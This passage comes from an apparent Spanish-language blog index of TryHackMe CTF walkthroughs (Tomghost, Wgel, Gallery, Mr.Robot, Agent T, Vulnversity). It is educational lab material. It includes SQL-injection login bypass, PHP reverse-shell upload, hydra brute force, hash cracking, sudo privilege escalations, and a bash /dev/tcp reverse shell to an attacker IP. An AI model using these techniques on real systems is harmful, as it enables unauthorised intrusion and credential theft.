multiple/webapps/49039.rb -------------------------------------------------------- --------------------------------- Al probar con el 48143.py no funciona bien. E encontrado otro exploit de 00theway https://github.com/00theway/Ghostcat-CNVD-2020-10487\nwget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py python3 ajpShooter.py http://10.10.126.65 8009 /WEB-INF/web.xml read En una línea específica un usuario y una contraseña\n\u0026lt;description\u0026gt; Welcome to GhostCat skyfuck:--pass-- \u0026lt;/description\u0026gt; Escalada de privilegios Merlin Con ssh ya nos podemos conectar como skyfuck. Al entrar lo primero que vemos son dos archivos: credential.pgp y tryhackme.asc, con un cat tryhackme.asc podemos ver que contiene una pgp private key con la cual podemos ver el contenido de credential.pgp.\ngpg --import tryhackme.asc gpg --decrypt credential.pgp Nos pide una passphrase\nCon python nos vamos a montar un servidor en la máquina víctima para pasarnos el archivo tryhackme.asc a nuestra máquina con python3 -m http.server y desde nuestra máquina con wget nos lo pasamos wget http://10.10.126.65:8000/tryhackme.asc\nDesde nuestra máquina vamos a sacar el hash con\ngpg2john tryhackme.asc \u0026gt; hash Ahora ya podemos mediante el diccionario rockyou.txt hacer fuerza bruta y encontrar la passphrase\njohn --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt hash Nos encuentra las passphrase, ahora ya podemos aceder al credentials.pgp y ver las credenciales de el usuario merlin.\nDentro de la carpeta personal de merlin podemos ver la flag user.txt.\nRoot Con un sudo -l podemos ver que puede ejecutar zip como root sin proporcionar contraseña, nos podemos aprovechar de esto de la siguiente forma.\nTF=$(mktemp -u) sudo zip $TF /etc/hosts -T -TT \u0026#39;sh #\u0026#39; sudo rm $TF Ahora ya somos root y podemos ver la flag en /root/root.txt\n","date":"2022-12-30","id":123,"permalink":"/writeups/tryhackme/tomghost/","summary":"Link de la máquina\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.126.65\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","CVE-2020-1938","zip"],"title":"Tomghost"},{"content":"","date":"2022-12-30","id":124,"permalink":"/tags/zip/","summary":"","tags":[],"title":"zip"},{"content":"https://tryhackme.com/room/wgelctf\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.176.77\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.176.77 PING 10.10.176.77 (10.10.176.77) 56(84) bytes of data. 64 bytes from 10.10.176.77: icmp_seq=1 ttl=63 time=108 ms --- 10.10.176.77 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 108.118/108.118/108.118/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.176.77 -oG allPort Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.176.77 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,80 -sC -sV 10.10.176.77 -oN target PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94961b66801b7648682d14b59a01aaaa (RSA) | 256 18f710cc5f40f6cf92f86916e248f438 (ECDSA) |_ 256 b90b972e459bf32a4b11c7831033e0ce (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Web En el puerto 80 está corriendo una web, con el whatweb podemos ver un poco de información sobre la web.\n❯ whatweb 10.10.176.77 http://10.10.176.77 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.176.77], Title[Apache2 Ubuntu Default Page: It works] Con ctrl + u podemos ver el código de la web en el cual se ve una línea comentada con un mensaje: \u0026lt;!-- Jessie don't forget to udate the webiste --\u0026gt; Con esto podemos intuir que hay un usuario llamado Jessie\nwfuzz y gobuster (subdirectorios) Con wfuzz vamos a buscar subdirectorios mediante un diccionario ubicado en /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt con el siguiente comando\n❯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.176.77/FUZZ Nos reporta el subdirectorio /sitemap en el cual hay una web con muchos apartados. Con wfuzz otra vez, vamos a buscar subdirectorios sobre el directorio sitemap, mediante el mismo comando, pero cambiando la ubicación: de 10.10.176.77/FUZZ a 10.10.176.77/sitemap/FUZZ. No ha encontrado nada, probamos con gobuster y otro diccionario el cual está ubicado en /usr/share/wordlists/dirb/common.txt.\ngobuster dir -u http://10.10.176.77/sitemap/ -w /usr/share/wordlists/dirb/common.txt Infiltración Ahora nos reporta varios subdirectorios, entre ellos un .ssh, el cual contiene una rsa private key\nPara conectarnos por ssh la vamos a guardar en un archivo llamado id_rsa, y nos vamos a conectar con el usuario Jessie que encontramos anteriormente y la llave que encontramos\nchmod 600 id_rsa ssh -i id_rsa jessie@10.10.176.77 User Flag Podemos ver la flag en /home/jessie/Documents/user_flag.txt.\nRoot Flag Con un sudo -l podemos ver que podemos ejecutar wget como root sin proporcionar contraseña. En https://gtfobins.github.io/gtfobins/wget/#shell Podemos ver que hay una forma de leer archivos aprovechándonos del wget . Intuyendo que la flag está en /root/root_flag.txt, con los siguientes comandos deberíamos de poder leerlo\nLFILE=/root/root_flag.txt wget -i $LFILE Ya tenemos la flag!!!\n","date":"2022-12-28","id":125,"permalink":"/writeups/tryhackme/wgel/","summary":"https://tryhackme.com/room/wgelctf\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.176.77\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","wget"],"title":"Wgel"},{"content":"","date":"2022-12-28","id":126,"permalink":"/tags/wget/","summary":"","tags":[],"title":"wget"},{"content":"https://tryhackme.com/room/gallery666\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.250.47\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.250.47 PING 10.10.250.47 (10.10.250.47) 56(84) bytes of data. 64 bytes from 10.10.250.47: icmp_seq=1 ttl=63 time=52.3 ms --- 10.10.250.47 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 52.300/52.300/52.300/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n❯ sudo nmap -p- --open -sS --min-rate 5000 -Pn -vvv -n 10.10.110.190 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.110.190 5 │ [*] Open ports: 80,8080 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p80,8080 -sC -sV 10.10.110.190 -oN target PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 8080/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-title: Simple Image Gallery System | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION Parámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Web Con el whatweb podemos ver más información de la web\n❯ whatweb 10.10.110.190 http://10.10.110.190 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.110.190], Title[Apache2 Ubuntu Default Page: It works] Buscando subdirectorios Con wfuzz vamos a fuzzear mediante el dicionario /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt para encontrar subdirectorios\nwfuzz -c -t 200 --hc=404 --hh=42126 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.151.26/FUZZ Nos reporta el directorio /gallery\n/gallery Al entrar nos lleva a /gallery/login.php y vemos un panel para iniciar sessión, primero comprobamos si admin:admin funciona, pero no. Podemos probar con usuario ' or 1 = 1-- - y cualquier contraseña y ya nos entra\nAdmin Ahora estamos dentro de la cuenta de administrador y podemos ver los álbums, Al entrar dentro de uno vemos que nos deja subir fotos nuevas.\nAl probar de subir un .php no lo acepta, con burpsuite he probado con un diccionario de extensiones y solo acepta extensiones de fotos\nDentro de la configuración del perfil del admin, hay un apartado para cambiar la foto. El mensaje, dice, selecciona un archivo. Podemos intentar mandarle un archivo .php para mandarnos una reverse shell\nIntrusión Vamos a intentar subir un archivo php de pentestmonkey para la reverse shell: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php.\nEs importante cambiar las líneas de ip y port y poner la ip de nuestra máquina y el puerto por el que nos vamos a poner en escucha con netcat (443)\nAhora ya podemos subir el archivo y al darle a update, recibimos a reverse shell\nEscalada de privilegios Tratamiento de la tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Mike Si vamos a /home/mike podemos ver que hay un archivo llamado user.txt el cual debe contener la flag de usuario, Pero no tenemos permisos para leerlo ni para entrar en la carpeta Documents e Images.\nDespués de estar un rato buscando he encontrado que en /var/backups hay una carpeta llamada mike_home_backup en la cual están los archivos de mike y tenemos permisos para leerlos.\nDentro de Documents hay un archivo con 3 contraseñas de otras webs con el usuario mike, he probado si alguna de estas sirve para esta máquina pero no.\nEn Images, hay 3 fotos las cuales he mirado si tenían algún archivo oculto pero no\nCon un ls -a podemos ver que hay un historial .bash_historycon un cat podemos ver su contenido, dentro hay un comando en el que parece especificar una contraseña: sudo -lb3stpassw0rdbr0xx con el comando su mike y proporcionando la contraseña b3stpassw0rdbr0xx ya somos mike\nYa podemos ver la flag\nRoot Con sudo -l Podemos ver que puede ejecutar lo siguiente como root sin contraseña /bin/bash /opt/rootkit.sh\nAl ejecutar sudo /bin/bash /opt/rootkit.sh y le damos a read nos abre un archivo con un texto muy largo. Como estamos ejecutando nano como root podemos probar con ctrl + r, ctrl + x y escribiendo reset; sh 1\u0026gt;\u0026amp;0 2\u0026gt;\u0026amp;0, ya somos root\n","date":"2022-12-21","id":127,"permalink":"/writeups/tryhackme/gallery/","summary":"https://tryhackme.com/room/gallery666\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.250.47\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","sqli","file upload"],"title":"Gallery"},{"content":"","date":"2022-12-20","id":128,"permalink":"/tags/fuerza-bruta/","summary":"","tags":[],"title":"Fuerza bruta"},{"content":"","date":"2022-12-20","id":129,"permalink":"/tags/hash-raw-md5/","summary":"","tags":[],"title":"hash raw-md5"},{"content":"https://tryhackme.com/room/mrrobot\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.193.138\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.193.138 PING 10.10.193.138 (10.10.193.138) 56(84) bytes of data. 64 bytes from 10.10.193.138: icmp_seq=1 ttl=63 time=56.6 ms --- 10.10.193.138 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 56.631/56.631/56.631/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.193.138 -oG allPort Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.46.125 5 │ [*] Open ports: 80,443 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p80,443 -sV -sC 10.10.193.138 -oN target PORT STATE SERVICE VERSION 80/tcp open http Apache httpd |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache 443/tcp open ssl/http Apache httpd |_http-server-header: Apache |_http-title: Site doesn\u0026#39;t have a title (text/html). | ssl-cert: Subject: commonName=www.example.com | Not valid before: 2015-09-16T10:45:03 |_Not valid after: 2025-09-13T10:45:03 Web Con el whatweb podemos ver mas información sobre la web\n❯ whatweb 10.10.193.138 http://10.10.193.138 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.193.138], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN] Al entrar a la web vemos una animación que simula el arranque de un Linux, quando termina muestra el siguiente mensaje\nMas abajo vemos una \u0026ldquo;terminal\u0026rdquo; en la cual solo se pueden usar los comandos que salen arriba\nTodos los comandos muestran videos, fotos y mensajes relacionados con la serie\u0026hellip;\nBuscando subdirectorios Para ver si hay subdirectorios vamos a usar la herramienta gpbuster para fusear mediante un diccionario que está en /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt con el siguiente comando:\n❯ gobuster dir -u http://10.10.46.125 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== 2022/12/19 21:57:53 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 236] [--\u0026gt; http://10.10.193.138/images/] /blog (Status: 301) [Size: 234] [--\u0026gt; http://10.10.193.138/blog/] /rss (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/feed/] /sitemap (Status: 200) [Size: 0] /login (Status: 302) [Size: 0] [--\u0026gt; http://10.10.193.138/wp-login.php] /0 (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/0/] /feed (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/feed/] /video (Status: 301) [Size: 235] [--\u0026gt; http://10.10.193.138/video/] /image (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/image/] /atom (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/feed/atom/] /wp-content (Status: 301) [Size: 240] [--\u0026gt; http://10.10.193.138/wp-content/] /admin (Status: 301) [Size: 235] [--\u0026gt; http://10.10.193.138/admin/] /audio (Status: 301) [Size: 235] [--\u0026gt; http://10.10.193.138/audio/] /intro (Status: 200) [Size: 516314] /wp-login (Status: 200) [Size: 2613] /css (Status: 301) [Size: 233] [--\u0026gt; http://10.10.193.138/css/] /rss2 (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/feed/] /license (Status: 200) [Size: 309] /wp-includes (Status: 301) [Size: 241] [--\u0026gt; http://10.10.193.138/wp-includes/] /js (Status: 301) [Size: 232] [--\u0026gt; http://10.10.193.138/js/] /Image (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/Image/] /rdf (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/feed/rdf/] /page1 (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/] /readme (Status: 200) [Size: 64] /robots (Status: 200) [Size: 41] /dashboard (Status: 302) [Size: 0] [--\u0026gt; http://10.10.193.138/wp-admin/] Nos reporta muchos subdirectorios, despues de ir probando uno por uno, e visto 2 que son importantes\n/robots/ Contenido del /robots/\nUser-agent: * fsocity.dic key-1-of-3.txt Ya tenemos la primera key\n❯ curl http://10.10.193.138/key-1-of-3.txt ---------- key 1 ---------- En el robots también indica otro archivo fsocity.dic, con wget nos lo podemos passar a nuestra máquina\n❯ wget http://10.10.193.138/fsocity.dic Es un dicionario con 858160 palabras\n/wp-admin/ En wp-admin hay un panel de login de WordPress, probamos con las típicas credenciales admin:admin, no funcionan pero hay un pequeño detalle importante\nEn vez de decir que las credenciales són incorrectas, especifica que es lo que esta mal, aprovechando esto podemos usar un diccionario de usuarios hasta que no de ese error y despues con las contraseñas\nIntrusion Con hydra vamos a probar con los usuarios de el dicionario que nos descargamos de /fsocity.dic/ con la contraseña test\n❯ hydra -L fsocity.dic -p test 10.10.193.138 http-post-form \u0026#34;/wp-login.php:log=^USER^\u0026amp;pwd=^PWD^:Invalid username\u0026#34; -t 30 [80][http-post-form] host: 10.10.193.138 login: Elliot password: test Ya tenemos un usuario (Elliot), ahora con hydra también vamos a probar contraseñas con el dicionario rockyou.txt\n❯ hydra -l Elliot -P fsocity.dic 10.10.33.39 http-post-form \u0026#34;/wp-login.php:log=^USER^\u0026amp;pwd=^PWD^:The password you entered for the username Elliot is incorrect\u0026#34; -t 30 [80][http-post-form] host: 10.10.193.138 login: Elliot password: ER28-0652 Con estas credenciales ya podemos iniciar session en la web, eso nos lleva al panel de administración de la web\nAhora el objetivo seria encontrar algún sitio en el que poder subir archivos, para mandar un php malicioso que nos envié una reverse shell\nEn el apartado de posts podemos subir o escribir archivos pero se quedan en texto plano\nEn el media podemos subir archivos.\nPero después de comprobarlo con el burpsuite como en la maquina Vulnversity solo acepta archivos con extensiones de fotos.\nDentro del apartado de apariencia, en el editor podemos ver que salen los archivos php de la web, los cuales podemos editar.\nPor ejemplo vamos a abrir el 404.php y vamos a sustituir lo que había por el código de la reverse shell, es importante cambiar el puerto por el que nos ponemos en escucha y la ip de nuestra maquina\nAhora nos ponemos en escucha por el puerto 443\nnc -nlvp 443 Ahora al poner un subdirectorio random http://10.10.193.138/okjihogyklasd ejecuta el 404.php y recibimos la conexión.\nEscalada de privilegios En el directorio /home/robot esta la segunda flag, también hay un archivo con un hash raw-md5\n❯ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3]) censored password (?) Ahora al intentar convertirnos en robot sale este error\n$ su robot su: must be run from a terminal Con python -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' se soluciona el problema\ndaemon@linux:/$ python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; daemon@linux:/$ su robot su robot Password: abcdefghijklmnopqrstuvwxyz robot@linux:/$ Ahora con find / -perm -4000 -exec ls -ldb {} \\; 2\u0026gt;/dev/null, ay un que no deveria de estar ahi, nmap\nnmap --interactive Eso abre el nmap en modo interactive, como se esta ejecutando como root, si hacemos !sh para spawnear una sh, ya somos root, podemos ver la ultima flag en /root\n","date":"2022-12-20","id":130,"permalink":"/writeups/tryhackme/mr.robot/","summary":"https://tryhackme.com/room/mrrobot\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.193.138\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Mediana","Linux","Fuerza bruta","hash raw-md5","php","nmap"],"title":"Mr.Robot"},{"content":"","date":"2022-12-20","id":131,"permalink":"/tags/nmap/","summary":"","tags":[],"title":"nmap"},{"content":"","date":"2022-12-20","id":132,"permalink":"/tags/php/","summary":"","tags":[],"title":"php"},{"content":"https://tryhackme.com/room/agentt\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.175.238\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.175.238 PING 10.10.175.238 (10.10.175.238) 56(84) bytes of data. 64 bytes from 10.10.175.238: icmp_seq=1 ttl=63 time=47.7 ms --- 10.10.175.238 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 47.680/47.680/47.680/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.175.238 -oG allPort Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.175.238 5 │ [*] Open ports: 80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p80 -sC -sV 10.10.175.238 -oN target PORT STATE SERVICE VERSION 80/tcp open http PHP cli server 5.5 or later (PHP 8.1.0-dev) |_http-title: Admin Dashboard Infiltración Con searchsploit podemos comprobar si la version de php es vulnerable\n❯ searchsploit PHP 8.1.0-dev -------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------- --------------------------------- PHP 8.1.0-dev - \u0026#39;User-Agentt\u0026#39; Remote Code Execution | php/webapps/49933.py -------------------------------------------------------- --------------------------------- Hay un exploit de remote code execution, con searchsploit -m 49933 nos lo podemos pasar a nuestra máquina.\n❯ python3 49933.py Enter the full host url: http://10.10.175.238 Interactive shell is opened on http://10.10.175.238 Can\u0026#39;t acces tty; job crontol turned off. $ whoami root Ya tenemos una shell interactiva como root, pero no podemos salir del directorio /var/www/html, vamos a intentar crear una reverse shell.\nNos ponemos en escucha por el puerto 443\nnc -nlvp 443 Intentamos mandarnos la reverse shell con bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1, pero no recibimos nada, probamos con bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026quot; ahora si, ya podemos ver la flag que está en /flag.txt\n","date":"2022-12-19","id":133,"permalink":"/writeups/tryhackme/agent-t/","summary":"https://tryhackme.com/room/agentt\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.175.238\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","php"],"title":"Agent T"},{"content":"Aprende sobre el reconocimiento activo, los ataques a aplicaciones web y la escalada de privilegios.\nhttps://tryhackme.com/room/vulnversity\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.23.174\nReconocimiento Para la fase de Reconocimiento vamos a usar nmap.\n¿Qué es nmap?\nnmap es una herramienta potente, gratuita y de código abierto que se utiliza para descubrir hosts y servicios en una red informática. En nuestro ejemplo, usamos nmap para escanear esta máquina e identificar todos los servicios que se ejecutan en un puerto en particular. nmap tiene muchas capacidades, a continuación hay una tabla que resume algunas de las funciones que proporciona.\nParámetros típicos nmap:\nParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) -p\u0026rsquo;port' Escanear unos puertos en específico \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG archivo Para que guarde el escaneo en format grepeable en un archivo llamado archivo -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Escanea la máquina, ¿cuántos puertos están abiertos? ❯ nmap -p- 10.10.23.174 PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3128/tcp open squid-http 3333/tcp open dec-notes Tiene un total de 6 puertos abiertos\n¿Qué versión del proxy se está ejecutando en la máquina? ❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel En el puerto 3128 se puede ver la version de la proxy 3.5.12\n¿Cuántos puertos escaneará nmap si se usó la bandera -p-400? Como se indica en el parámetro (-p-400), Escaneara 400 puertos\nUsando el indicador nmap -n, ¿qué no resolverá? Con él -n no hacer DNS\n¿Cuál es el sistema operativo más probable que esté ejecutando esta máquina? ❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel En el puerto 3333 indica que es un Ubuntu\n¿En qué puerto se está ejecutando el servidor web? ❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel El servidor web se está ejecutando por el puerto 3333\nLocalizando subdirectorios Para esta parte vamos a buscar directorios con gobuster y wfuzz usando el diccionario /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n¿Cuál es el directorio que tiene una página de formulario de carga? GoBuster GoBuster es una herramienta utilizada para la fuerza bruta de URI (directorios y archivos), subdominios DNS y nombres de host virtual. Para esta máquina, nos centraremos en usarla para directorios de fuerza bruta.\nParámetro Función -e Imprima las URL completas en su consola -u La URL de destino -w Ruta a tu diccionario -U y -P Nombre de usuario y contraseña para autenticación básica -p\u0026rsquo;x' Proxy a utilizar para las solicitudes -c \u0026lsquo;http cookies\u0026rsquo; Especifique una cookie para simular su autenticación ❯ gobuster dir -u http://10.10.23.174:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== 2022/12/18 01:37:49 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 320] [--\u0026gt; 